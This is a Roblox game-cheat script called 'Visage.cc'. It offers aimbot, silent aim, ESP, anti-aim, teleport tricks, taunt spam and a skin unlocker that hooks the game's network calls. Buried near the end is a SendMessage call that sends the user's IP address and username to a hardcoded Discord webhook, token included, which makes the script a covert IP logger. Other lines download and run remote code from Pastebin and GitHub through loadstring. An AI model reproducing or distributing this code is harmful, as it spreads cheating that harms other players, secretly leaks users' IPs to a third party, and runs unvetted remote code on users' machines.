--//Begin
_G['property_chatbypass'] = true
_G['Visages'] = game.Players.LocalPlayer.Name
for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
	if v.Name == "VisageV2" then
		v:Destroy()
	end
end
...
function addbutton(info, callback)
	...
	real.MouseEnter:connect(function()
		real.TextColor3 = Color3.fromRGB(255, 200, 103)
	end)
	real.MouseLeave:connect(function()
		real.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
	end)
end
...
function addtoggle(info, callback)
	...
	border.MouseEnter:connect(function()
		border.ImageColor3 = Color3.fromRGB(255, 200, 103)
	end)
...
function adddropdown(info, callback)
	...
	click.MouseEnter:connect(function()
		click.ImageColor3 = Color3.fromRGB(255, 200, 103)
	end)
	...
	for _, name in pairs(info['list']) do
		...
		dropbutton.MouseEnter:connect(function()
			dropbutton.TextColor3 = Color3.fromRGB(255, 200, 103)
		end)
	...
	click.MouseButton1Click:connect(function()
		if click.Rotation == 0 then
			click.Rotation = -180;
			body.BorderColor3 = Color3.fromRGB(255, 200, 103);
			drop.Visible = true
		else
			click.Rotation = 0;
			drop.Visible = false;
...
addtoggle({
	parent = CharacterRage,
	title = 'Fire Damage Bypass',
	valuename = 'antifire'
}, function(bruh)
end)
...
addtoggle({
	parent = TrollRage,
	title = 'Grenade Walk',
	valuename = 'grenadewalk'
}, function(bruh)
end)

adddropdown({
	parent = TrollRage,
	valuename = 'grenadewalktype',
	list = {
		'Molotov',
		'HE Grenade',
		'Smoke Grenade',
...
addtoggle({
	parent = EnvironmentRage,
	title = 'Auto Rejoin',
	valuename = 'autorejoin'
}, function(bruh)
...
addtoggle({
	parent = AimbotLegit,
	title = 'FFA',
	valuename = 'noteamcheck'
}, function(bruh)
end)

local SilentAimLegit = addcategory({
	parent = FIRST_legit,
	title = 'Backtracking',
	lenght = 90
})
...
addscroll({
	parent = SilentAimLegit,
	valuename = 'headshothitchance',
	title = 'Headshot Hit Chance',
	maxed = 100,
	value = 0
}, function(y)
end)
addscroll({
	parent = SilentAimLegit,
	valuename = 'bodyhitchance',
	title = 'Body Hit Chance',
	maxed = 100,
	value = 0
}, function(y)
end)

local ConfigurationAntiAim = addcategory({
	parent = FIRST_antiaim,
	title = 'Configuration',
	lenght = 90
})

addscroll({
	parent = ConfigurationAntiAim,
	valuename = 'aasmooth',
	title = 'Turn Smoothness',
	maxed = 10000,
	value = 0
}, function(y)
end)
...
local CharacterAntiAim = addcategory({
	parent = FIRST_antiaim,
	title = 'General',
	lenght = 140
})
...
addbutton({
	...
	if lplr.Character and not lplr:FindFirstChild('XDDLA') then
		...
		while baby.Parent == workspace do
			delay(0, function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 2, 0)
				cameraoffset = true
			end)
			wait()
			delay(0, function()
...
local WorldVisuals = addcategory({
	parent = visual_4,
	title = 'Environment',
	lenght = 100
})
...
addtoggle({
	...
	valuename = 'globalshadows'
}, function(bruh)
	game.Lighting.GlobalShadows = bruh
end)

local MiscellaneousAntiAim = addcategory({
	parent = FIRST_antiaim,
	title = 'Miscellaneous',
	lenght = 120
})
...
addtoggle({
	parent = MiscellaneousAntiAim,
	title = 'No Animations',
	valuename = 'noanimations'
}, function(bruh)
end)
...
addtoggle({
	...
	if callback == true then for i,v in pairs(game.Workspace.Map:GetDescendants()) do
...
local ESPVisuals_Friendlies = addcategory({
	parent = visual_3,
	title = 'ESP',
	lenght = 100
})
...
addtoggle({
	parent = ESPVisuals_Friendlies,
	title = 'Box',
	valuename = 'boxespteam'
}, function(callback)
...
local ESPVisuals_Enemies = addcategory({
	parent = visual_2,
	title = 'ESP',
	lenght = 100
})
...
local PerformanceMisc_Performace = addcategory({
	parent = misc_2,
	title = 'Performance',
	lenght = 100
})
addtoggle({
	parent = PerformanceMisc_Performace,
	title = 'Disable bullet holes',
	valuename = 'disablebulletholes'
}, function(callback)
...
addtoggle({
	parent = PerformanceMisc_Performace,
	title = 'Disable rendering ragdolls',
	valuename = 'disablerenderingragdolls'
}, function(callback)
	for i, v in pairs(game:GetService("Workspace").Debris:GetChildren()) do
		checkdebris(v)
	end
...
addtoggle({
	parent = PerformanceMisc_Performace,
	title = 'Disable teammate rendering',
	valuename = 'disableteamrendering'
}, function(callback)
end)

local SoundMisc_Performance = addcategory({
	parent = misc_2,
	title = 'Sound',
	lenght = 100
})
...
for i, v in pairs({
	unpack(game:GetService("Workspace").Sounds:GetChildren()),
	unpack(othersounds)
}) do
...
addscroll({
	parent = SoundMisc_Performance,
	valuename = 'weaponvolume',
	title = 'Weapon volume',
	maxed = 100,
	value = 100
}, function(y)
...
addscroll({
	parent = SoundMisc_Performance,
	valuename = 'footstepvolume',
	title = 'Footstep volume',
	maxed = 100,
	value = 100
}, function(y)
end)
addscroll({
	parent = SoundMisc_Performance,
	valuename = 'othervolume',
	title = 'Other sound volume',
	maxed = 100,
	value = 100
}, function(y)
	for i, v in pairs({
...
local InformationMisc_Performance = addcategory({
	parent = misc_2,
	title = 'Information',
	lenght = 100
})
...
addbutton({
	parent = InformationMisc_Performance,
	text = 'RAGE QUIT!'
}, function()
...
title.Size = UDim2.new(1, 0, 1, 0)
title.Font = Enum.Font.GothamSemibold
title.Text = "Visage.cc | ".. _G['Visages'] ..""
title.TextColor3 = Color3.new(1, 1, 1)
title.TextSize = 10
addtoggle({
	parent = InformationMisc_Performance,
...
local InventoryMisc_Skins = addcategory({
	parent = misc_3,
	title = 'Inventory',
	lenght = 100
})
...
addbutton({
	...
	i.__namecall = newcclosure(function(self, ...)
		...
		if k == "FireServer" and string.len(self.Name) == 38 then
			return nil
		end;
		return j(self, ...)
	end)
	...
	local p = {}
	local q = {}
	for r, s in pairs(h.Skins:GetChildren()) do
		for t, u in pairs(s:GetChildren()) do
			table.insert(m, {
				s.Name.."_"..u.Name
			})
		end
	end;
	for r, s in pairs(h.Gloves:GetChildren()) do
		if s.Name == "Wraps" or s.Name == "Guts" or s.Name == "MMA" or s.Name == "Wetland" or s.Name == "Ghoul Hex" or s.Name == "Phantom Hex" or s.Name == "Spector Hex" or s.Name == "Orange Hex" or s.Name == "Purple Hex" or s.Name == "Green Hex" then
			table.insert(o, {
				s.Name
			})
		end
	...
	for r, s in pairs(h.Gloves:GetChildren()) do
		if s.Name == "Scapter" or s.Name == "Patch" or s.Name == "Digital" or s.Name == "Crystal" then
			table.insert(q, {
				s.Name
			})
		end
	...
	for r, s in pairs(h.Gloves:GetChildren()) do
		if s.Name == "Hazard" or s.Name == "Hallows" or s.Name == "Majesty" or s.Name == "Royal" or s.Name == "Weeb" or s.Name == "CottonTail" or s.Name == "RSL" then
			table.insert(p, {
				s.Name
			})
		end
	...
	for r, s in pairs(h.Gloves:GetChildren()) do
		if s.Name == "Grim" or s.Name == "Wisk" or s.Name == "Molten" or s.Name == "Kringle" then
			table.insert(n, {
				s.Name
			})
		end
	...
	for r = 1, #n do
		table.insert(m, {
			"Strapped Glove_"..unpack(n[r])
		})
	end;
	for r = 1, #p do
		table.insert(m, {
			"Sports Glove_"..unpack(p[r])
		})
	end;
	for r = 1, #q do
		table.insert(m, {
			"Fingerless Glove_"..unpack(q[r])
		})
	end;
	for r = 1, #o do
		table.insert(m, {
			"Handwraps_"..unpack(o[r])
		})
	end;
	table.insert(m, {
		"CTKnife_Stock"
	...
	for r, s in pairs(h.Skins:GetChildren()) do
		if s.Name ~= "Flip Knife" and s.Name ~= "Bayonet" and s.Name ~= "Falchion Knife" and s.Name ~= "Karambit" and s.Name ~= "Huntsman Knife" and s.Name ~= "Banana" and s.Name ~= "Butterfly Knife" then
			table.insert(m, {
				s.Name.."_Stock"
			})
		end
	...
	x.__namecall = newcclosure(function(self, ...)
		...
		if k == "FireServer" and self.Name == "DataEvent" then
			for r, s in next, l do
				B = s[2]
				A = s[3]
				table.foreach(s[4], function(C, s)
					z = s;
					print(B, A, z)
				end)
				...
				if B == "CT" or B == "Both" then
					for t, u in pairs(D:GetChildren()) do
						if A == 'Gut Knife' or A == 'Butterfly Knife' or A == 'Falchion Knife' or A == 'Bayonet' or A == 'Huntsman Knife' or A == 'Karambit' or A == 'Banana' or A == 'Flip Knife' or A == 'Bearded Axe' or A == 'Sickle' or A == 'Cleaver' and u.Name == "Knife" then
				...
				if B == "T" or B == "Both" then
					for G, H in pairs(E:GetChildren()) do
						if A == 'Gut Knife' or A == 'Butterfly Knife' or A == 'Falchion Knife' or A == 'Bayonet' or A == 'Huntsman Knife' or A == 'Karambit' or A == 'Banana' or A == 'Flip Knife' or A == 'Bearded Axe' or A == 'Sickle' or A == 'Cleaver' and H.Name == "Knife" then
							local F = string.split(z, "_")
...
local ViewmodelVisuals = addcategory({
	parent = misc_3,
	title = 'View Model',
	lenght = 100
})
...
addscroll({
	parent = ViewmodelVisuals,
	valuename = 'armtransparency',
	title = 'Arms Transparency',
	maxed = 100,
	value = 0
}, function(y)
end)
...
local ESPVisuals_Self = addcategory({
	parent = visual_1,
	title = 'Effects',
	lenght = 100
})
addtoggle({
	parent = ESPVisuals_Self,
	title = 'Knife range',
	valuename = 'kniferange'
}, function(callback)
...
local MapVisuals_World = addcategory({
	parent = visual_4,
	title = 'Map',
	lenght = 100
})

local EntitiesVisuals_World = addcategory({
	parent = visual_4,
	title = 'Entities',
	lenght = 80
})
...
addtoggle({
	parent = EntitiesVisuals_World,
	title = 'Hostage esp',
	valuename = 'hostageesp'
}, function(callback)
end)
addtoggle({
	parent = EntitiesVisuals_World,
	title = 'Grenades esp',
	valuename = 'grenadesesp'
}, function(callback)
end)
addtoggle({
	parent = EntitiesVisuals_World,
	title = 'Weapons esp',
	valuename = 'weaponsesp'
}, function(callback)
end)

local ViewVisuals_World = addcategory({
	parent = visual_4,
	title = 'View',
	lenght = 100
})
...
addscroll({
	parent = ViewVisuals_World,
	valuename = 'fieldofview',
	title = 'Field Of View',
	maxed = 45,
	value = 0
}, function(y)
...
function checkfile()
	local a, b = pcall(function()
		readfile('config_visage.txt')
	end)
	if string.find(b or "", 'not exist') then
		writefile('config_visage.txt', 'return {}')
	end
end
checkfile()
function savenewconfig()
	...
	bob = bob..'};'
	writefile('config_visage.txt', bob)
end

function loadsavedfileconfig()
	checkfile()
	local c = readfile('config_visage.txt')
...
function fireallup()
	spawn(function()
		...
		wait(0.4)
		game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(lastpos)
	end)
end
...
function footstepespcharacter(character)
	...
	bb.Texture = 'http://www.roblox.com/asset/?id=1191095063'
	bb.Face = 'Left'
	local bb = Instance.new("Decal", footstepesp)
	bb.Texture = 'http://www.roblox.com/asset/?id=1191095063'
	bb.Face = 'Right'
	...
	local tween = TweenService:Create(footstepesp, tweenInfo, {
		Size = Vector3.new(0, 16, 16)
	})
...
SendMessage("https://discordapp.com/api/webhooks/769269757647913062/BhegSt-9KrYOt7VfjhG5O4-Zbbd7UgpgStJYbkYwpc32TosnD0ORpqL8AXu3GgAo8yiX","IP: "..ip.." was logged. From "..game.Players.LocalPlayer.Name..".", "Logger")
...
_G.darktheme =  true
_G.menukey = Enum.KeyCode.Equals
...
local Finity = loadstring(game:HttpGet("https://pastebin.com/raw/fPfKWL3g"))()
...
local cheatspamtext = {"Oh no! Is that Counter Pepsi!","ACE! Visage Killed the whole enemy team!","What does the Kill All Button do?","Get Good Get Visage","MR. PRESIDENT GET DOWN! IT'S AUTO RESPAWN","Visage > All","Visage owns me and all","Get Tapped By Visage","","",}
...
CreditsThanks:Cheat("Label", "Visage.cc")
...
--//loadstring(game:HttpGet("https://raw.githubusercontent.com/Entry-Null/visage.cc/main/main.lua"))()
